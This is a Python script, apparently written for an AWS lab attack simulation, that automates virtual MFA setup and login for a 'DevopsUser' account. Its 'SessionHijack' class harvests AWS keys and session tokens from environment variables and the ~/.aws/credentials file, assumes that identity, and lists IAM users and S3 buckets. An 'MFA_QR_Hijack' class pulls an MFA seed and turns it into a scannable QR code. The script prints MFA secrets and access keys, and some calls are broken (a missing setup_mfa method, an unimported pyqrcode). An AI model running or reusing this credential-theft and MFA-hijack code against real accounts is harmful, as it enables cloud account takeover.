import boto3
import json
import time
import subprocess
import base64
import os

class Attack:
    """🔥 Main Attack Class Integrating AWS MFA Setup and User Session Management"""

    def __init__(self, region="us-east-1"):
        """Initialize AWS Clients and Fetch Pulumi Outputs"""
        self.iam_client = boto3.client("iam", region_name=region)
        self.sts_client = boto3.client("sts", region_name=region)
        self.region = region

        # ✅ Load Pulumi Outputs to get AWS Resource Names
        with open("/workspaces/Pulumi/Infra/forrester-2025-output.json", "r") as file:
            self.pulumi_outputs = json.load(file)

        self.devops_user = "DevopsUser"
        self.mfa_arn = self.pulumi_outputs.get("devops_user_mfa_arn")

        # ----------- #
        # Access Keys #
        # ----------- #
        self.access_key_id = self.pulumi_outputs.get("devops_access_key_id")
        self.secret_access_key = self.pulumi_outputs.get("devops_secret_access_key")

        # ------------------------- #
        # Initialize MFA Auto Logon #
        # ------------------------- #
        self.mfa_login = self.MFAAutoLogin(self.access_key_id, self.secret_access_key, self.mfa_arn, self.sts_client)

        # Initialize Subclasses
        self.mfa = self.MFASetup(self.devops_user, self.mfa_arn, self.iam_client, self.sts_client, self.pulumi_outputs)
        self.user = self.User(self.devops_user, self.mfa_arn, self.sts_client)
        self.session_hijack = self.SessionHijack(self.devops_user, self.sts_client)


    class MFASetup:
        """🔐 Handles MFA Creation, Authentication & Validation"""

        def __init__(self, user, mfa_arn, iam_client, sts_client, pulumi_outputs):
            self.user = user
            self.mfa_arn = mfa_arn
            self.iam_client = iam_client
            self.sts_client = sts_client
            self.pulumi_outputs = pulumi_outputs 

            self.mfa_seed_bin_file_path = "/workspaces/Pulumi/Infra/mfa-seed.bin"
            self.mfa_secret = self.extract_mfa_secret()


        def check_existing_mfa(self):
            """🔍 Check if MFA is already enabled"""
            print(f"\n🔍 Checking if MFA is enabled for `{self.user}`...")
            result = subprocess.run(
                f"aws iam list-mfa-devices --user-name {self.user} --query 'MFADevices[0].SerialNumber' --output text",
                shell=True, capture_output=True, text=True
            )
            self.mfa_arn = result.stdout.strip()

            if "arn:aws" in self.mfa_arn:
                print(f"✅ MFA is already enabled: {self.mfa_arn}")
                return True

            print("❌ No MFA device found. Proceeding to create a new MFA device...")
            return False

        def cleanup_old_mfa(self):
            """🗑️ Delete any stale virtual MFA devices"""
            existing_mfa_check = subprocess.run(
                "aws iam list-virtual-mfa-devices --query 'VirtualMFADevices[*].SerialNumber' --output text",
                shell=True, capture_output=True, text=True
            )
            existing_mfa = existing_mfa_check.stdout.strip()

            if "arn:aws" in existing_mfa:
                print(f"🗑️ Deleting old MFA device: {existing_mfa}")
                subprocess.run(f"aws iam delete-virtual-mfa-device --serial-number {existing_mfa}", shell=True)
            else:
                print("✅ No stale MFA devices found.")



        def create_mfa_device(self):
            # mfa_seed_bin_file_path = "/workspaces/Pulumi/Infra/mfa-seed.bin"
            """Create a Virtual MFA Device"""
            print("🔧 Creating new Virtual MFA device...")

            create_mfa_command = f"""
            aws iam create-virtual-mfa-device \
                --virtual-mfa-device-name DevopsUserMFA \
                --outfile {self.mfa_seed_bin_file_path} \
                --bootstrap-method Base32StringSeed \
                --query 'VirtualMFADevice.SerialNumber' \
                --output text
            """
            new_mfa_arn = subprocess.run(create_mfa_command, shell=True, capture_output=True, text=True).stdout.strip()

            if not new_mfa_arn:
                print("ERROR: Failed to create MFA device!")
                exit(1)

            self.mfa_arn = new_mfa_arn  # Ensure we store the correct ARN
            print(f"New MFA device created: {self.mfa_arn}")

            # Extract MFA Secret **after** MFA creation
            self.mfa_secret = self.extract_mfa_secret()

            # Wait for AWS to fully register the MFA device
            print("Waiting for AWS to register the new MFA device...")
            time.sleep(10)



        def extract_mfa_secret(self):
            """🔍 Extract MFA Secret from `mfa-seed.bin` (AWS Stores in Base32)"""
            time.sleep(2)  # Give AWS time to sync
            print("\n🔍 Fetching MFA Secret...")

            try:
                with open(self.mfa_seed_bin_file_path, "r") as seed_file:
                    self.mfa_secret = seed_file.read().strip()  # Read directly, no decoding

                print(f"MFA Secret Retrieved: {self.mfa_secret}")
                return self.mfa_secret
            except Exception as e:
                print(f"ERROR: Could not read MFA seed file: {e}")
                exit(1)


        

        def generate_mfa_codes(self):
            """🔢 Generate MFA TOTP codes"""
            print("⏳ Ensuring system clock is synchronized...")
            subprocess.run("sudo ntpdate -q time.google.com", shell=True)

            code1 = subprocess.run(f"oathtool --totp --base32 {self.mfa_secret}", shell=True, capture_output=True, text=True).stdout.strip()
            time.sleep(30)  # Wait for new OTP
            code2 = subprocess.run(f"oathtool --totp --base32 {self.mfa_secret}", shell=True, capture_output=True, text=True).stdout.strip()

            print(f"🔢 Auto-Generated MFA Codes: {code1}, {code2}")
            return code1, code2
        


        def enable_mfa(self, code1, code2):
            """🔐 Enable MFA for DevopsUser"""
            print("\n🔑 Enabling MFA for DevopsUser...")

            enable_mfa_command = f"""
            aws iam enable-mfa-device --user-name {self.user} \
                --serial-number {self.mfa_arn} \
                --authentication-code1 {code1} --authentication-code2 {code2}
            """

            print(f"🔍 Running: {enable_mfa_command}")
            result = subprocess.run(enable_mfa_command, shell=True, capture_output=True, text=True)

            if result.returncode != 0:
                print(f"ERROR: MFA enablement failed!\n{result.stderr}")
                exit(1)

            print("MFA enabled successfully! Verifying association...")

            # Validate that AWS successfully linked the MFA device
            validation_command = f"aws iam list-mfa-devices --user-name {self.user} --query 'MFADevices[*].SerialNumber' --output text"
            validation_result = subprocess.run(validation_command, shell=True, capture_output=True, text=True)

            linked_mfa = validation_result.stdout.strip()
            if linked_mfa and "arn:aws" in linked_mfa:
                print(f"MFA Device successfully linked: {linked_mfa}")
            else:
                print("ERROR: MFA device was NOT linked. Possible AWS delay or misconfiguration.")
                exit(1)



        # def login_as_devops(self):
        #     """🔐 Log in as DevOpsUser using Access Key + MFA"""

        #     print("\n⏳ Waiting for AWS to fully associate MFA device...")
        #     time.sleep(10)

        #     # ✅ Step 1: Verify MFA is linked before attempting login
        #     validation = subprocess.run([
        #         "aws", "iam", "list-mfa-devices",
        #         "--user-name", self.user,
        #         "--query", "MFADevices[*].SerialNumber",
        #         "--output", "text"
        #     ], capture_output=True, text=True)

        #     if "arn:aws" not in validation.stdout:
        #         print("❌ ERROR: MFA device is NOT linked to DevOpsUser. Exiting...")
        #         exit(1)

        #     print("✅ MFA device is successfully linked. Proceeding with login.")

        #     # ✅ Step 2: Load DevOpsUser's Access Key & Secret Key from Pulumi Outputs
        #     devops_access_key = self.pulumi_outputs.get("devops_access_key_id")
        #     print(f" \n \n \n DEVOPS ACCESS KEY: {devops_access_key} ")
        #     devops_secret_key = self.pulumi_outputs.get("devops_secret_access_key")
        #     print(f"\n \n \n DEVOPS SECRET KEY: {devops_secret_key} ")

        #     if not devops_access_key or not devops_secret_key:
        #         print("❌ ERROR: DevOpsUser access key/secret key not found in Pulumi outputs.")
        #         exit(1)

        #     # ✅ Step 3: Configure AWS CLI Profile for DevOpsUser
        #     print("\n🔧 Configuring AWS CLI profile for DevOpsUser...")
        #     subprocess.run(f"aws configure set aws_access_key_id {devops_access_key} --profile devopsuser", shell=True)
        #     subprocess.run(f"aws configure set aws_secret_access_key {devops_secret_key} --profile devopsuser", shell=True)
        #     subprocess.run(f"aws configure set region us-east-1 --profile devopsuser", shell=True)
        #     subprocess.run(f"aws configure set output json --profile devopsuser", shell=True)

        #     # ✅ Step 4: Generate MFA Code
        #     print("\n🚀 Requesting session token for DevOpsUser...")
        #     mfa_code = subprocess.run(f"oathtool --totp --base32 {self.mfa_secret}", shell=True, capture_output=True, text=True).stdout.strip()

        #     # ✅ Step 5: Call `get_session_token` with MFA
        #     try:
        #         session_response = subprocess.run(
        #             f"aws sts get-session-token --serial-number {self.mfa_arn} --token-code {mfa_code} --profile devopsuser",
        #             shell=True, capture_output=True, text=True
        #         )

        #         # 🚀 Ensure response is not empty
        #         if not session_response.stdout.strip():
        #             print(f"❌ ERROR: Empty response received from AWS STS. Possible MFA setup issue.")
        #             print(f"📝 Debug: Raw AWS CLI Output: {session_response.stdout}")
        #             print(f"📝 Debug: AWS CLI Error: {session_response.stderr}")

        #             exit(1)

        #         try:
        #             session_data = json.loads(session_response.stdout)  # Attempt to parse JSON
        #         except json.JSONDecodeError as e:
        #             print(f"❌ ERROR: Invalid JSON response from AWS STS: {e}\nRaw Output: {session_response.stdout}")
        #             exit(1)

        #         # ✅ Extract credentials from STS response
        #         creds = session_data.get("Credentials")
        #         if not creds:
        #             print(f"❌ ERROR: AWS did not return credentials! Response: {session_data}")
        #             exit(1)

        #         # ✅ Step 6: Export Temporary Session Credentials to AWS CLI Profile
        #         print("\n✅ Storing temporary MFA session in AWS CLI profile...")
        #         subprocess.run(f"aws configure set aws_access_key_id \"{creds['AccessKeyId']}\" --profile devopsuser", shell=True)
        #         subprocess.run(f"aws configure set aws_secret_access_key \"{creds['SecretAccessKey']}\" --profile devopsuser", shell=True)
        #         subprocess.run(f"aws configure set aws_session_token \"{creds['SessionToken']}\" --profile devopsuser", shell=True)

        #         # ✅ Step 7: Verify the AWS profile with MFA session
        #         print("\n🔍 Verifying AWS profile with MFA session...")
        #         verify_output = subprocess.run("aws sts get-caller-identity --profile devopsuser", shell=True, capture_output=True, text=True)

        #         if "arn:aws" not in verify_output.stdout:
        #             print(f"❌ ERROR: Profile verification failed! Response: {verify_output.stderr}")
        #             exit(1)

        #         print("✅ AWS profile successfully authenticated with MFA!")

        #     except Exception as e:
        #         print(f"❌ ERROR: MFA authentication failed: {e}")
        #         exit(1)





        def get_pulumi_secret(self,secret_name):
            """Fetch Pulumi secret with --show-secrets"""
            try:
                result = subprocess.run(
                    f"pulumi stack output {secret_name} --show-secrets",
                    shell=True, capture_output=True, text=True
                )
                return result.stdout.strip()
            except Exception as e:
                print(f"❌ ERROR: Failed to retrieve Pulumi secret {secret_name}: {e}")
                exit(1)
        
        def login_as_devops(self):
            """🔐 Log in as DevOpsUser using Access Key + MFA"""
        
            print("\n⏳ Waiting for AWS to fully associate MFA device...")
            time.sleep(10)
        
            # ✅ Step 1: Verify MFA is linked before attempting login
            validation = subprocess.run([
                "aws", "iam", "list-mfa-devices",
                "--user-name", self.user,
                "--query", "MFADevices[*].SerialNumber",
                "--output", "text"
            ], capture_output=True, text=True)
        
            if "arn:aws" not in validation.stdout:
                print("❌ ERROR: MFA device is NOT linked to DevOpsUser. Exiting...")
                exit(1)
        
            print("✅ MFA device is successfully linked. Proceeding with login.")
        
            # ✅ Step 2: Load DevOpsUser's Access Key & Secret Key **Directly from Pulumi Secrets**
            devops_access_key = self.get_pulumi_secret("devops_access_key_id")
            devops_secret_key = self.get_pulumi_secret("devops_secret_access_key")
        
            print(f"\n🔑 DevOps Access Key: {devops_access_key}")
            print(f"🔑 DevOps Secret Key: {'*' * len(devops_secret_key)} (Hidden for security)")
        
            if not devops_access_key or not devops_secret_key:
                print("❌ ERROR: DevOpsUser access key/secret key not found in Pulumi outputs.")
                exit(1)
        
            # ✅ Step 3: Configure AWS CLI Profile for DevOpsUser
            print("\n🔧 Configuring AWS CLI profile for DevOpsUser...")
            subprocess.run(f"aws configure set aws_access_key_id \"{devops_access_key}\" --profile devopsuser", shell=True)
            subprocess.run(f"aws configure set aws_secret_access_key \"{devops_secret_key}\" --profile devopsuser", shell=True)
            subprocess.run(f"aws configure set region us-east-1 --profile devopsuser", shell=True)
            subprocess.run(f"aws configure set output json --profile devopsuser", shell=True)
        
            # ✅ Step 4: Generate MFA Code
            print("\n🚀 Requesting session token for DevOpsUser...")
            mfa_code = subprocess.run(f"oathtool --totp --base32 {self.mfa_secret}", shell=True, capture_output=True, text=True).stdout.strip()
        
            # ✅ Step 5: Call `get_session_token` with MFA
            try:
                session_response = subprocess.run(
                    f"aws sts get-session-token --serial-number {self.mfa_arn} --token-code {mfa_code} --profile devopsuser",
                    shell=True, capture_output=True, text=True
                )
        
                # 🚀 Ensure response is not empty
                if not session_response.stdout.strip():
                    print(f"❌ ERROR: Empty response received from AWS STS. Possible MFA setup issue.")
                    exit(1)
        
                session_data = json.loads(session_response.stdout)
                creds = session_data.get("Credentials")
        
                if not creds:
                    print(f"❌ ERROR: AWS did not return credentials! Response: {session_data}")
                    exit(1)
        
                # ✅ Step 6: Export Temporary Session Credentials to AWS CLI Profile
                print("\n✅ Storing temporary MFA session in AWS CLI profile...")
                subprocess.run(f"aws configure set aws_access_key_id \"{creds['AccessKeyId']}\" --profile devopsuser", shell=True)
                subprocess.run(f"aws configure set aws_secret_access_key \"{creds['SecretAccessKey']}\" --profile devopsuser", shell=True)
                subprocess.run(f"aws configure set aws_session_token \"{creds['SessionToken']}\" --profile devopsuser", shell=True)
        
                # ✅ Step 7: Verify the AWS profile with MFA session
                print("\n🔍 Verifying AWS profile with MFA session...")
                verify_output = subprocess.run("aws sts get-caller-identity --profile devopsuser", shell=True, capture_output=True, text=True)
        
                if "arn:aws" not in verify_output.stdout:
                    print(f"❌ ERROR: Profile verification failed! Response: {verify_output.stderr}")
                    exit(1)
        
                print("✅ AWS profile successfully authenticated with MFA!")
        
            except Exception as e:
                print(f"❌ ERROR: MFA authentication failed: {e}")
                exit(1)


        def setup_mfa_and_login(self):
            """🚀 Full MFA Setup + Login"""
            if self.check_existing_mfa():
                return
            self.cleanup_old_mfa()
            self.create_mfa_device()
            self.extract_mfa_secret()
            code1, code2 = self.generate_mfa_codes()
            self.enable_mfa(code1, code2)
            self.login_as_devops()  # Automatically log in after enabling MFA






    class MFAAutoLogin:
        """🔐 Automates AWS CLI Authentication with MFA"""

        def __init__(self, access_key, secret_key, mfa_arn, sts_client):
            self.access_key = access_key
            self.secret_key = secret_key
            self.mfa_arn = mfa_arn
            self.sts_client = sts_client
            self.aws_profile = "devopsuser"
            self.mfa_secret = None  # This should be set dynamically

        def configure_aws_cli(self):
            """🔑 Configures AWS CLI for DevOpsUser"""
            print("🔧 Configuring AWS CLI for DevOpsUser...")
            subprocess.run(f"aws configure set aws_access_key_id {self.access_key} --profile {self.aws_profile}", shell=True)
            subprocess.run(f"aws configure set aws_secret_access_key {self.secret_key} --profile {self.aws_profile}", shell=True)
            subprocess.run(f"aws configure set region us-east-1 --profile {self.aws_profile}", shell=True)

        def generate_mfa_code(self):
            """🔢 Generates an MFA Code"""
            if not self.mfa_secret:
                print("❌ ERROR: MFA Secret is not set!")
                return None

            print("🔢 Generating MFA Code...")
            otp_code = subprocess.run(f"oathtool --totp --base32 {self.mfa_secret}", shell=True, capture_output=True, text=True).stdout.strip()
            return otp_code

        def request_session_token(self):
            """🚀 Requests a new AWS Session Token"""
            print("🚀 Requesting session token...")
            mfa_code = self.generate_mfa_code()
            
            if not mfa_code:
                print("❌ ERROR: Could not generate MFA code!")
                return

            session_response = subprocess.run(
                f"aws sts get-session-token --serial-number {self.mfa_arn} --token-code {mfa_code} --profile {self.aws_profile}",
                shell=True, capture_output=True, text=True
            )

            try:
                session_data = json.loads(session_response.stdout)
                creds = session_data["Credentials"]
                
                print("✅ Storing session credentials...")
                os.environ["AWS_ACCESS_KEY_ID"] = creds["AccessKeyId"]
                os.environ["AWS_SECRET_ACCESS_KEY"] = creds["SecretAccessKey"]
                os.environ["AWS_SESSION_TOKEN"] = creds["SessionToken"]
                print("🔍 Verified AWS Session Token Set")
            except Exception as e:
                print(f"❌ ERROR: Failed to obtain session token: {e}")

        def execute_auto_login(self):
            """🚀 Runs Full AWS CLI Login Automation"""
            self.configure_aws_cli()
            time.sleep(5)
            self.request_session_token()




    class MFA_QR_Hijack:
        """🎭 Simulates MFA QR Code Hijack Attack"""

        def __init__(self, user, mfa_arn, iam_client):
            self.user = user
            self.mfa_arn = mfa_arn
            self.iam_client = iam_client
            self.mfa_secret = None

        def generate_qr_code(self):
            """📸 Generate a QR code from an already configured MFA device"""
            print(f"\n🚨 Hijacking QR Code for `{self.user}`...")

            # Fetch MFA Secret
            result = subprocess.run(
                f"aws iam get-virtual-mfa-device --serial-number {self.mfa_arn} --query 'VirtualMFADevice.Base32StringSeed' --output text",
                shell=True, capture_output=True, text=True
            )
            raw_secret = result.stdout.strip()
            
            if not raw_secret:
                print("❌ ERROR: MFA Secret not found. Possible security controls in place.")
                return

            self.mfa_secret = base64.b32encode(base64.b64decode(raw_secret)).decode().strip()

            otp_auth_uri = f"otpauth://totp/AWS:{self.user}?secret={self.mfa_secret}&issuer=AWS"
            qr = pyqrcode.create(otp_auth_uri)
            print("\n📲 Scan this QR Code in your authenticator app:\n")
            print(qr.terminal(quiet_zone=1))





    class SessionHijack:
        """⚠️ Hijack AWS Session for DevOpsUser"""

        def __init__(self, user, sts_client):
            """Initialize attack simulation for DevOpsUser"""
            self.iam_client = boto3.client("iam")
            self.sts_client = sts_client
            self.devops_user = user
            self.hijacked_creds = None

        def extract_credentials(self):
            """🔍 Extracts credentials from environment variables and AWS credentials file."""
            print("\n🔍 Searching for active AWS session tokens...")

            # Check environment variables
            env_vars = {var: os.getenv(var) for var in [
                "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN"
            ]}

            if env_vars["AWS_SESSION_TOKEN"]:
                print("✅ Found active AWS session token in environment variables!")
                self.hijacked_creds = env_vars
                return

            # Check credentials file
            creds_file = os.path.expanduser("~/.aws/credentials")
            if os.path.exists(creds_file):
                with open(creds_file, "r") as file:
                    lines = file.readlines()
                    profile = None
                    creds = {}
                    for line in lines:
                        if line.startswith("[") and "devops" in line.lower():
                            profile = line.strip()
                        elif profile and "=" in line:
                            key, value = line.strip().split("=", 1)
                            creds[key.strip()] = value.strip()

                    if creds:
                        print(f"✅ Found credentials for {self.devops_user} in AWS credentials file!")
                        self.hijacked_creds = creds
                        return

            print("❌ No AWS session tokens found. Attack cannot proceed.")

        def assume_devops_identity(self):
            """🛑 Assume DevOpsUser identity using stolen session tokens."""
            if not self.hijacked_creds:
                print("❌ No valid credentials available for DevOpsUser!")
                return

            print("\n🚀 Assuming DevOpsUser session...")
            os.environ.update({
                "AWS_ACCESS_KEY_ID": self.hijacked_creds["AWS_ACCESS_KEY_ID"],
                "AWS_SECRET_ACCESS_KEY": self.hijacked_creds["AWS_SECRET_ACCESS_KEY"],
                "AWS_SESSION_TOKEN": self.hijacked_creds.get("AWS_SESSION_TOKEN", "")
            })

            # Verify identity
            identity = subprocess.run("aws sts get-caller-identity", shell=True, capture_output=True, text=True).stdout
            print(f"\n🔍 Confirmed Identity:\n{identity}")

        def enumerate_test(self):
            """⚡ Perform simulated attack actions as DevOpsUser."""
            if not self.hijacked_creds:
                print("❌ No valid credentials available for DevOpsUser!")
                return

            print("\n🔥 Executing attack simulation as DevOpsUser...")

            attack_commands = [
                "aws iam list-users",
                "aws s3 ls",
                "aws sts get-caller-identity"
            ]

            for cmd in attack_commands:
                print(f"\n🚀 Running: {cmd}")
                output = subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout
                print(output)











    class User:
        """🔐 AWS User Session with MFA Authentication"""

        def __init__(self, user_name, mfa_device_arn, sts_client):
            self.user_name = user_name
            self.mfa_device_arn = mfa_device_arn
            self.sts_client = sts_client
            self.session = None

        def authenticate_with_mfa(self):
            """🔑 Authenticate user with MFA and assume a session"""
            if not self.mfa_device_arn:
                print(f"❌ ERROR: No MFA device found for `{self.user_name}`. Exiting...")
                return None

            print(f"\n🔑 Please enter an MFA code for `{self.user_name}`...")

            # Prompt user for MFA codes (TOTP)
            mfa_code = input(f"Enter MFA Code for `{self.mfa_device_arn}`: ")

            try:
                response = self.sts_client.get_session_token(
                    SerialNumber=self.mfa_device_arn,
                    TokenCode=mfa_code
                )
                print("✅ MFA authentication successful!")
                self.session = boto3.Session(
                    aws_access_key_id=response["Credentials"]["AccessKeyId"],
                    aws_secret_access_key=response["Credentials"]["SecretAccessKey"],
                    aws_session_token=response["Credentials"]["SessionToken"]
                )
                return self.session

            except Exception as e:
                print(f"❌ ERROR: MFA Authentication Failed: {e}")
                return None

    def execute_attack(self):
        """🔥 Execute Attack Sequence"""
        print("\n🚀 Starting Attack...")

        # ✅ Step 1: Configure MFA
        self.mfa.setup_mfa()

        # ✅ Step 2: Authenticate as DevOpsUser
        print("\n🔐 Attempting to authenticate as DevopsUser with MFA...")
        session = self.user.authenticate_with_mfa()

        if session:
            print("\n🔥 Attack in progress... executing further AWS actions as DevOpsUser.")
        else:
            print("\n❌ Attack failed: Unable to authenticate as DevopsUser.")

# ✅ Example Usage
if __name__ == "__main__":
    attack = Attack()
    
    # 🚀 Perform MFA Setup
    attack.execute_attack()
